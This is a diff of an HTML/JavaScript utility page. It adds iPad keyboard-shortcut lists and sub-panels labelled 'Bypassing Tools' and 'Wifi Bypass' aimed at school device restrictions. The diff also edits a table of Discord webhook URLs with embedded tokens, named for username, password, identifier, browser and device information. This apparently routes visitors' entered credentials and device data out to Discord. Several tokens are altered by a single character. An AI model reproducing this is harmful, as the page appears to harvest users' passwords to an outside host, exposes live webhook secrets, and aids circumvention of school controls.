+            <li>Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.</li>
+            <li>Open a new private tab: Press Command (⌘) + Shift + N.</li>
+            <li>Open a new tab: Press Command (⌘) + T or Command (⌘) + N.</li>
+            <li>Close the current tab: Press Command (⌘) + W.</li>
+            <li>Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.</li>
+            <li>Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.</li>
+            <li>Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.</li>
+            <li>Reopen the last closed tab: Press Shift + Command (⌘) + T.</li>
+            <li>Go to a specific tab (1-8): Press Command (⌘) + (1-8).</li>
+            <li>Go to the last tab: Press Command (⌘) + 9.</li>
+            <li>Open the Tab Grid: Press Shift + Command (⌘) + .</li>
+            <li>Open a new Incognito tab: Press Shift + Command (⌘) + N.</li>
+            <li>Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.</li>
+            <li>Open a new window: Press Option (⌥) + Command (⌘) + N.</li>
+          </ul>
+          <h3>General Navigation and Text Editing:</h3>
+          <ul>
+            <li>Navigate between elements in an app (like fields, lists, buttons): Press Tab.</li>
+            <li>Select all text: Press Command (⌘) + A.</li>
+            <li>Copy selected text: Press Command (⌘) + C.</li>
+            <li>Cut selected text: Press Command (⌘) + X.</li>
+            <li>Paste copied text: Press Command (⌘) + V.</li>
+            <li>Undo the last action: Press Command (⌘) + Z.</li>
+            <li>Redo the last undone action: Press Command (⌘) + Shift + Z.</li>
+            <li>Jump to the top of a page: Press Command (⌘) + Up Arrow.</li>
+            <li>Jump to the bottom of a page: Press Command (⌘) + Down Arrow.</li>
+            <li>Highlight text one character at a time: Press Shift + Left or Right Arrow.</li>
+          </ul>
+          <p>To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
+      </div>
+    </div>
+  </div>
+
+
 </div>
 
 <script>
@@ -2114,16 +2771,16 @@ const RESET_CODE_SECRET = 'Reset.2579'; // The secret code for resetting attempt
 // All Discord Webhook URLs, mapped to the channel names from the screenshot
 const webhooks = {
     usernameInformation: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
-    passwordInformation: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
+    passwordInformation: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc5FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
     identifierInformation: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
     invaildUsernameInformation: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
     invaildPasswordInformation: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
     invaildIdentifierInformation: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
-    attemptCounterInformation: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
+    attemptCounterInformation: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
     attemptExceededInformation: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
-    resetInformation: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq', // This seems to be the "RESET_INFORMATION" channel
+    resetInformation: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJjkeiThIZ6gYCJILFSHfSDSnsq', // This seems to be the "RESET_INFORMATION" channel
     correctInformation: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
-    incorrectInformation: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
+    incorrectInformation: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRJgbSlRDWOJUvHVqsK248ip',
     userInformation: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
     browserInformation: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
     deviceInformation: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
@@ -3095,6 +3752,48 @@ function togglePanel(panelId) {
   updateStats();
 }
 
+// Function for sub-panels like iPad Restrictions sub-buttons or Bypassing Tools
+function toggleSubPanel(subPanelId, buttonText) {
+    const subPanel = document.getElementById(subPanelId);
+    if (!subPanel) return;
+
+    const isVisible = subPanel.classList.contains('hidden') === false;
+
+    // Hide all other sub-panels in the same modal if desired, or just toggle this one
+    // For now, I'll assume they should toggle independently or at least close others within their parent if they are mutually exclusive.
+    // If multiple sub-panels can be open at once, remove this loop.
+    const parentModal = subPanel.closest('.settings-content');
+    if (parentModal) {
+        parentModal.querySelectorAll('.text-popup-content').forEach(panel => {
+            if (panel.id !== subPanelId) {
+                panel.classList.add('hidden');
+            }
+        });
+    }
+
+
+    if (isVisible) {
+        subPanel.classList.add('hidden');
+        logActivity(`Sub-panel closed: ${buttonText}`);
+    } else {
+        subPanel.classList.remove('hidden');
+        logActivity(`Sub-panel opened: ${buttonText}`);
+        
+        // Special logic for "Wifi Bypass" to guide user
+        if (subPanelId === 'wifiBypassText') {
+            const wifiInfoModal = document.getElementById('schoolWifiInfoModal');
+            if (wifiInfoModal && wifiInfoModal.style.display === 'none') {
+                showNotification("Redirecting to School Wifi Information...");
+                // Optionally open the Wifi Info modal here after a short delay
+                // setTimeout(() => togglePanel('schoolWifiInfoModal'), 1000);
+            }
+        }
+    }
+    stats.buttonPresses++;
+    updateStats();
+}
+
+
 
 function minimizePanel(button) {
   const panel = button.closest('.panel');
@@ -3969,7 +4668,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
   
   document.addEventListener('click', (e) => {
-    if ((e.target.tagName === 'BUTTON' && !e.target.closest('.panel-controls') && !e.target.classList.contains('submit-btn')) || e.target.closest('.quick-btn')) {
+    if ((e.target.tagName === 'BUTTON' && !e.target.closest('.panel-controls') && !e.target.classList.contains('submit-btn')) || e.target.closest('.quick-btn') || e.target.closest('.main-menu-btn')) { // Added .main-menu-btn
         stats.buttonPresses++;
         updateStats();
     }
